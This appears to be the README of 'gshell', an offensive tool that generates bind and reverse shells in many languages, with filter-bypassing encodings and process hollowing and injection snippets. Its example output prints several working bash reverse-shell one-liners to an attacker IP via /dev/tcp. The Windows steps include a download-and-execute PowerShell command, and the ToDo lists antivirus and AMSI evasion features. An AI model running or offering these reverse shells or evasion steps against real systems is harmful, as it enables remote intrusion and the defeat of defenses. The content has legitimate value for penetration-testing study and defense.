# Introduction

[![made-with-python](http://forthebadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
[![built-with-love](https://forthebadge.com/images/badges/built-with-love.svg)](https://forthebadge.com)

A simple yet flexible cross-platform shell generator tool.

Name: G(Great) Shell

Description: A cross-platform shell generator tool that lets you generate whichever shell you want, in any system you want, giving you full control and automation.

**If you find this tool helpful, then please give me a ⭐ as it tells me that I should add more features to it. (THANKS)**

Is cross-platform, you can use it in operating systems such as:

- Unix-based systems
- GNU/Linux
- Windows
- macOS

Generates the following shells:

- Bind Shells: The target has a listening port and we connect to the target.
- Reverse Shells: We have a listening port and the target connects to us.

Supports the following encodings (as of now):

- URL Encoding: Bypass URL filters
- Base64/32/16 Encodings: Bypass string/keyword filters
- PowerShell Base64 Encoding

Supports the follow IP versions:

- IPv4
- IPv6

Supported protocols:

- TCP
- UDP
- ICMP

**Note: You can add your own shells that use other protocols such as DNS**. 

Supports the following languages and tools:

- PowerShell
- Python
- Bash
- Sh
- Perl
- Socat
- Netcat
- Nc
- Awk
- Lua
- NodeJS
- OpenSSL
- PHP
- Ruby
- Telnet
- Golang
- C#
- Dart
- Groovy
- Many more...

**It is limitless, feel free to add as many as you desire!**

**The shells are stored in markdown files as it makes it easy for everyone.**

You can add more bind shells by adding markdown code blocks the following file:

```sh
shells/bind_shells.md
```

You can also add more reverse shells by adding markdown code blocks the following file:

```sh
shells/reverse_shells.md
```

These can be one-liners and multi-liners, it doesn't matter. You can even add C# multi-liners code blocks if you want.

Example, replace the IP address and the port placeholders or variables values with these placeholders in your code:

```bash
$ip, $port
```

That's it, now you can add more.

> Note: It also offers advice and tips for performing and troubleshooting attacks.

# Overview

This is the help menu:

```powershell
PS C:\gshell> python .\gshell.py -h                                    
usage: gshell.py [-i <IP ADDRESS>] [-p <PORT NUMBER>] [-s <SHELL TYPE>] [-r] [-b] [--hollowing] [--injector] [--base64] [--base32] [--base16] [--url] [--no-block] [-l] [-a] [-h]

 ██████  ███████ ██   ██ ███████ ██      ██
██       ██      ██   ██ ██      ██      ██
██   ███ ███████ ███████ █████   ██      ██
██    ██      ██ ██   ██ ██      ██      ██
 ██████  ███████ ██   ██ ███████ ███████ ███████

Generate bind shells and/or reverse shells with style

            Version: 1.1
            Author: nozerobit
            Twitter: @nozerobit

Options:
  -i <IP ADDRESS>, --ip <IP ADDRESS>
                        Specify the IP address
  -p <PORT NUMBER>, --port <PORT NUMBER>
                        Specify the port number
  -s <SHELL TYPE>, --shell <SHELL TYPE>
                        Specify a shell type (python, nc, bash, etc)

Payload Types:
  -r, --reverse         Victim communicates back to the attacking machine
  -b, --bind            Open up a listener on the victim machine

Snippets Types:
  --hollowing           Print process hollowing code snippets
  --injector            Print process injector code snippets

Encoding Options:
  --base64              Add base64 encoding
  --base32              Add base32 encoding
  --base16              Add base16 encoding
  --url                 Add URL encoding

Markdown Options:
  --no-block            Skip ```
                        code
                        blocks
                        ``` while parsing

Help Options:
  -l, --list            List the available shell types
  -a, --advice          Print advice and tips to get connections
  -h, --help            Show this help message and exit
```

Example, generate bash reverse shells:

```sh
PS C:\gshell> python .\gshell.py -i 192.168.111.120 -p 443  -r -s bash 
[+] The IPv4 address: 192.168.111.120 is valid.
[+] The port number: 443 is valid.
[+] Shell type is valid
[+] Preparing reverse shells
[+] Generating bash shells
bash -i >& /dev/tcp/192.168.111.120/443 0>&1

----------------NEXT CODE BLOCK----------------

0<&196;exec 196<>/dev/tcp/192.168.111.120/443; sh <&196 >&196 2>&196

----------------NEXT CODE BLOCK----------------

/bin/bash -l > /dev/tcp/192.168.111.120/443 0<&1 2>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/tcp/192.168.111.120/443 0>&1

----------------NEXT CODE BLOCK----------------

bash -i >& /dev/udp/192.168.111.120/443 0>&1
```

# Installation in Linux

Clone or download the repository:

```sh
git clone https://github.com/nozerobit/gshell
```

Install the requirements:

```sh
python3 -m pip install -r gshell/requirements.txt
```

Add the tool to the `$PATH` environment variable:

```sh
sudo ln -s $(pwd)/gshell/gshell.py /usr/local/bin/gshell.py && chmod +x /usr/local/bin/gshell.py
```

Execute the tool:

```sh
gshell.py
```

# Installation in Windows

Clone or download the repository:

```sh
git clone https://github.com/nozerobit/gshell C:\\Tools
```

> Note: I created a directory named `Tools` in the `C:\` root directory.
> You can create this directory with the command `md C:\Tools`.

Install chocolatey with CMD as Administrator:

```cmd
@powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((new-object net.webclient).DownloadString('https://chocolatey.org/install.ps1'))" && SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin
```

Install python3 in Windows:

```powershell
choco install -y python3
```

Install pip:

```powershell
python -m pip install --upgrade pip
```

Install the requirements:

```powershell
python -m pip install -r gshell/requirements.txt
```

> Note: You can change the directory if you want, just make sure that it contains the `gshell` project folder.

Change to the project directory:

```powershell
cd C:\Tools
```

Execute the tool:

```powershell
python gshell.py
```

# Contact & Contributing

If you find any issues then you can open an issue, contact me on [twitter](https://twitter.com/nozerobit) or [discord (preferred)](https://discord.gg/jChyJgGs7Z). 

If you want to contribute then please feel free.

Any feedback is appreciated.

# ToDo

For the version 2.0 which should have the following:

1. Encryptors: To bypass AVs
2. Obfuscators: To bypass AVs
3. Anti-AMSI: To bypass AMSI
4. Shellcode Generator: For shellcode runners, binary explitation, etc.
